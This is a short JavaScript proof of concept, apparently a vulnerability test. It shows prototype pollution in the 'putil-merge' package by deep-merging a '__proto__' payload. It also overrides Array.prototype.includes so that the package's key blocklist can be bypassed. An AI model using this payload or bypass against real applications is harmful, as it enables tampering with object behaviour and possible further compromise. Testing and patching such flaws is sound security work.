Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const putil_merge = require('putil-merge');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
var obj = {};
console.log({}.polluted);
putil_merge(obj, payload, { deep: true });
console.log({}.polluted);